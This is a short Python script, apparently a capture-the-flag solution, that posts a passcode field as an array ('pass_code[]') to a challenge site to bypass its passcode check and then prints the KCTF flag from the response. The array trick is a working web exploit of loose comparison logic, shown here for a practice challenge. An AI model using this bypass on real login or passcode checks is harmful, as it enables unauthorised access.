#!/usr/bin/python3
from requests import post
from re import findall

url = "http://find-pass-code-one.kshackzone.com/"

r = post(url, data={"pass_code[]": "abcd"})

print(findall("KCTF{.*",r.text)[0].split('>')[0])